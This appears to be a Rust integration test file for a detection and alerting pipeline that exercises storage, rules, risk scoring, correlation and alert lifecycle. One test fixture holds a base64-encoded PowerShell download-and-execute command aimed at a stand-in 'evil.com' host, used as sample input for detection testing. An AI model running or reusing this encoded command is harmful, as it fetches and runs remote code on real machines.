use std::sync::Arc;
use std::time::Duration;

use sentinel_core::traits::{
    AlertRepository, AlertState, EventCursor, EventQuery, EventRepository,
};
use sentinel_core::{ChannelConfig, EventBus, Ulid};
use sentinel_correlation::{CorrelationConfig, CorrelationEngine};
use sentinel_event_bus::EventBusImpl;
use sentinel_events::{event::Payload, Event, ProcessContext, ProcessEvent, Severity, UserContext};
use sentinel_risk::{RiskConfig, RiskEngine};
use sentinel_rule_engine::RuleEngine;
use sentinel_storage::migrations;
use sentinel_storage::sqlite::{SqliteConfig, SqliteStorage};

async fn setup_db(tmp: &tempfile::TempDir) -> Arc<SqliteStorage> {
    let p = tmp.path().join("test.db");
    let storage = SqliteStorage::new(&SqliteConfig {
        path: p.to_string_lossy().to_string(),
        wal_mode: false,
        busy_timeout_ms: 5000,
        max_connections: 2,
    })
    .await
    .unwrap();
    migrations::run_all(storage.pool()).await.unwrap();
    Arc::new(storage)
}

#[tokio::test]
async fn test_event_insert_and_query() {
    let tmp = tempfile::TempDir::new().unwrap();
    let storage = setup_db(&tmp).await;

    let event = Arc::new(Event {
        id: Ulid::new().to_string(),
        r#type: "sentinel.process.create".into(),
        source: "process".into(),
        severity: 2,
        risk_score: 10,
        host_id: "test".into(),
        schema_version: 1,
        ..Default::default()
    });

    let repo = storage.events().await;
    repo.append(&[event.clone()]).await.unwrap();

    let found = repo
        .get(&Ulid::from_string(&event.id).unwrap())
        .await
        .unwrap()
        .unwrap();
    assert_eq!(found.r#type, "sentinel.process.create");

    let mut cursor = repo
        .query(EventQuery {
            event_types: vec!["sentinel.process.create".into()],
            ..Default::default()
        })
        .await
        .unwrap();
    assert!(cursor.total_count() >= 1);
}

#[tokio::test]
async fn test_alert_crud_integration() {
    let tmp = tempfile::TempDir::new().unwrap();
    let storage = setup_db(&tmp).await;

    let alert = sentinel_core::traits::Alert {
        id: Ulid::new(),
        rule_id: "test-rule".into(),
        correlation_id: Ulid::new(),
        risk_score: 750,
        severity: sentinel_core::Severity::Critical,
        state: AlertState::New,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
        acknowledged_by: None,
        acknowledged_at: None,
        events: vec![],
        context: serde_json::Value::Null,
        ai_summary: None,
    };

    let repo = storage.alerts().await;
    repo.create(&alert).await.unwrap();

    let a = repo.get(&alert.id).await.unwrap().unwrap();
    assert_eq!(a.risk_score, 750);
    assert_eq!(a.state, AlertState::New);

    repo.update_state(&alert.id, AlertState::Acknowledged, None)
        .await
        .unwrap();

    let updated = repo.get(&alert.id).await.unwrap().unwrap();
    assert_eq!(updated.state, AlertState::Acknowledged);
}

#[tokio::test]
async fn test_pipeline_rule_engine_evaluates() {
    let engine = RuleEngine::new(&sentinel_config::RuleEngineConfig::default())
        .await
        .unwrap();

    let event = Arc::new(Event {
        id: Ulid::new().to_string(),
        r#type: "sentinel.process.create".into(),
        source: "process".into(),
        severity: 2,
        risk_score: 10,
        host_id: "test".into(),
        schema_version: 1,
        ..Default::default()
    });

    let result = engine.evaluate(&event).await;
    assert!(result.rules_evaluated >= 0, "Rule engine should evaluate");
}

#[tokio::test]
async fn test_pipeline_risk_scoring() {
    let risk = RiskEngine::new(RiskConfig::default());

    let score = risk.calculate(200, "High", 1.0, None);
    assert!(score > 0, "Risk score should be > 0");

    let alert =
        risk.should_alert("rule-001", "Test Rule", score, "test", vec!["evt-1".into()], None);

    if score >= 100 {
        assert!(alert.is_some(), "Should generate alert above threshold");
    }
}

#[tokio::test]
async fn test_pipeline_correlation_chain() {
    let engine = CorrelationEngine::new(CorrelationConfig::default());

    let e1 = Arc::new(Event {
        id: Ulid::new().to_string(),
        r#type: "sentinel.process.create".into(),
        source: "process".into(),
        severity: 2,
        host_id: "test".into(),
        schema_version: 1,
        process: Some(sentinel_events::ProcessContext { pid: 1000, ..Default::default() }),
        ..Default::default()
    });

    let e2 = Arc::new(Event {
        id: Ulid::new().to_string(),
        r#type: "sentinel.process.create".into(),
        source: "process".into(),
        severity: 2,
        host_id: "test".into(),
        schema_version: 1,
        process: Some(sentinel_events::ProcessContext { pid: 1000, ..Default::default() }),
        ..Default::default()
    });

    let chain1 = engine.ingest(&e1);
    let chain2 = engine.ingest(&e2);

    assert!(!chain1.id.is_empty());
    assert_eq!(chain1.id, chain2.id, "Same PID should join same chain");
}

// ── E2E: Full pipeline PowerShell detection ──────────────────────

#[tokio::test]
async fn test_e2e_powershell_pipeline() {
    let tmp = tempfile::TempDir::new().unwrap();
    let storage = setup_db(&tmp).await;

    let bus = Arc::new(EventBusImpl::new(ChannelConfig::default())) as Arc<dyn EventBus>;
    let engine = RuleEngine::new(&sentinel_config::RuleEngineConfig::default())
        .await
        .unwrap();
    let correlation = CorrelationEngine::new(CorrelationConfig::default());
    let risk = RiskEngine::new(RiskConfig::default());
    let event_repo = storage.events().await;
    let alert_repo = storage.alerts().await;

    let mut sub = bus.subscribe_type("*").await.unwrap();

    // Realistic PowerShell encoded-command event
    let ps_event = Arc::new(Event {
        id: Ulid::new().to_string(),
        r#type: "sentinel.process.create".into(),
        source: "process".into(),
        timestamp: sentinel_core::now_proto_ts(),
        ingest_timestamp: sentinel_core::now_proto_ts(),
        severity: Severity::Notice as i32,
        risk_score: 15,
        host_id: "test-host".into(),
        schema_version: 1,
        process: Some(ProcessContext {
            pid: 12345,
            ppid: 1,
            name: "powershell".into(),
            path: "/usr/bin/pwsh".into(),
            command_line: "pwsh -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==".into(),
            user: Some(UserContext {
                sid: "1000".into(),
                username: "user".into(),
                domain: String::new(),
                is_elevated: false,
                is_system: false,
            }),
            ..Default::default()
        }),
        payload: Some(Payload::ProcessEvent(ProcessEvent {
            action: sentinel_events::process_event::Action::Create as i32,
            ..Default::default()
        })),
        tags: vec!["mitre:T1059.001".into(), "powershell".into()],
        ..Default::default()
    });

    event_repo.append(&[ps_event.clone()]).await.unwrap();
    bus.publish(ps_event.clone()).await.unwrap();

    let result = tokio::time::timeout(Duration::from_secs(15), async {
        loop {
            if let Some(event) = sub.receiver.recv().await {
                let _chain = correlation.ingest(&event);
                let eval = engine.evaluate(&event).await;

                if !eval.matches.is_empty() {
                    for m in &eval.matches {
                        let score = risk.calculate(m.risk_score, "Warning", 1.0, None);
                        if let Some(ra) = risk.should_alert(
                            &m.rule_id,
                            &m.rule_name,
                            score,
                            &event.source,
                            vec![event.id.clone()],
                            None,
                        ) {
                            let alert = sentinel_core::traits::Alert {
                                id: Ulid::new(),
                                rule_id: ra.rule_id.clone(),
                                correlation_id: ra
                                    .correlation_id
                                    .map(|_| Ulid::new())
                                    .unwrap_or_else(Ulid::new),
                                risk_score: ra.risk_score,
                                severity: match ra.severity {
                                    sentinel_risk::AlertSeverity::Low => {
                                        sentinel_core::Severity::Info
                                    },
                                    sentinel_risk::AlertSeverity::Medium => {
                                        sentinel_core::Severity::Notice
                                    },
                                    sentinel_risk::AlertSeverity::High => {
                                        sentinel_core::Severity::Warning
                                    },
                                    sentinel_risk::AlertSeverity::Critical => {
                                        sentinel_core::Severity::Critical
                                    },
                                },
                                state: AlertState::New,
                                created_at: chrono::Utc::now(),
                                updated_at: chrono::Utc::now(),
                                acknowledged_by: None,
                                acknowledged_at: None,
                                events: ra
                                    .event_ids
                                    .iter()
                                    .map(|s| Ulid::from_string(s).unwrap_or_else(|_| Ulid::new()))
                                    .collect(),
                                context: serde_json::Value::Null,
                                ai_summary: None,
                            };
                            alert_repo.create(&alert).await.unwrap();
                            let stored = alert_repo.get(&alert.id).await.unwrap().unwrap();
                            assert_eq!(stored.rule_id, alert.rule_id);
                            assert!(stored.risk_score > 0);
                            return;
                        }
                    }
                }
            }
        }
    })
    .await;

    assert!(result.is_ok(), "E2E pipeline timed out without generating alerts");
}

// ── E2E: Alert lifecycle (New → Acknowledged → Investigating → Resolved) ──

#[tokio::test]
async fn test_e2e_alert_lifecycle() {
    let tmp = tempfile::TempDir::new().unwrap();
    let storage = setup_db(&tmp).await;
    let repo = storage.alerts().await;

    let alert = sentinel_core::traits::Alert {
        id: Ulid::new(),
        rule_id: "sigma-rule-001".into(),
        correlation_id: Ulid::new(),
        risk_score: 750,
        severity: sentinel_core::Severity::Warning,
        state: AlertState::New,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
        acknowledged_by: None,
        acknowledged_at: None,
        events: vec![Ulid::new(), Ulid::new()],
        context: serde_json::json!({"source_ip": "10.0.0.5"}),
        ai_summary: None,
    };

    repo.create(&alert).await.unwrap();
    let read = repo.get(&alert.id).await.unwrap().unwrap();
    assert_eq!(read.state, AlertState::New);
    assert_eq!(read.risk_score, 750);
    assert_eq!(read.events.len(), 2);

    // Acknowledge
    repo.update_state(&alert.id, AlertState::Acknowledged, Some("analyst1".into()))
        .await
        .unwrap();
    let acked = repo.get(&alert.id).await.unwrap().unwrap();
    assert_eq!(acked.state, AlertState::Acknowledged);
    assert_eq!(acked.acknowledged_by, Some("analyst1".to_string()));

    // Investigate → ResolveFalsePositive
    repo.update_state(&alert.id, AlertState::Investigating, None)
        .await
        .unwrap();
    repo.update_state(&alert.id, AlertState::ResolvedFalsePositive, None)
        .await
        .unwrap();
    let resolved = repo.get(&alert.id).await.unwrap().unwrap();
    assert_eq!(resolved.state, AlertState::ResolvedFalsePositive);
}

// ── E2E: gRPC service construction ───────────────────────────────

#[tokio::test]
async fn test_e2e_grpc_service_constructs() {
    let tmp = tempfile::TempDir::new().unwrap();
    let storage = setup_db(&tmp).await;

    let registry = Arc::new(sentinel_core::CollectorRegistry::new());
    let (alert_tx, _) =
        tokio::sync::broadcast::channel::<sentinel_events::sentinel::api::v1::AlertStreamEvent>(16);
    let rule_engine = Arc::new(
        RuleEngine::new(&sentinel_config::RuleEngineConfig::default())
            .await
            .unwrap(),
    );
    let ai_engine = Arc::new(sentinel_ai::AiEngine::new(
        sentinel_ai::AiConfig::default(),
        sentinel_ai::AiConfig::default().create_provider(),
    ));

    let _svc =
        sentinel_api::SentinelService::new(storage, alert_tx, registry, rule_engine, ai_engine);
}

// ── E2E: Event round-trip through bus + storage ─────────────────

#[tokio::test]
async fn test_e2e_event_roundtrip() {
    let tmp = tempfile::TempDir::new().unwrap();
    let storage = setup_db(&tmp).await;
    let bus = Arc::new(EventBusImpl::new(ChannelConfig::default())) as Arc<dyn EventBus>;
    let repo = storage.events().await;

    let event = Arc::new(Event {
        id: Ulid::new().to_string(),
        r#type: "sentinel.network.connect".into(),
        source: "network".into(),
        timestamp: sentinel_core::now_proto_ts(),
        ingest_timestamp: sentinel_core::now_proto_ts(),
        severity: Severity::Notice as i32,
        risk_score: 10,
        host_id: "test".into(),
        schema_version: 1,
        payload: Some(Payload::NetworkEvent(sentinel_events::NetworkEvent {
            direction: sentinel_events::network_event::Direction::Outbound as i32,
            protocol: sentinel_events::network_event::Protocol::Tcp as i32,
            action: sentinel_events::network_event::Action::Connect as i32,
            local_addr: "10.0.0.1".into(),
            local_port: 54321,
            remote_addr: "93.184.216.34".into(),
            remote_port: 443,
            ..Default::default()
        })),
        tags: vec!["outbound".into()],
        ..Default::default()
    });

    repo.append(&[event.clone()]).await.unwrap();
    bus.publish(event.clone()).await.unwrap();

    let mut sub = bus.subscribe_type("*").await.unwrap();
    let received = tokio::time::timeout(Duration::from_secs(3), sub.receiver.recv())
        .await
        .unwrap()
        .expect("No event from bus");

    assert_eq!(received.source, "network");
    assert!(received.tags.contains(&"outbound".to_string()));

    let stored = repo
        .get(&Ulid::from_string(&event.id).unwrap())
        .await
        .unwrap()
        .expect("Event not in storage");
    assert_eq!(stored.id, event.id);
}
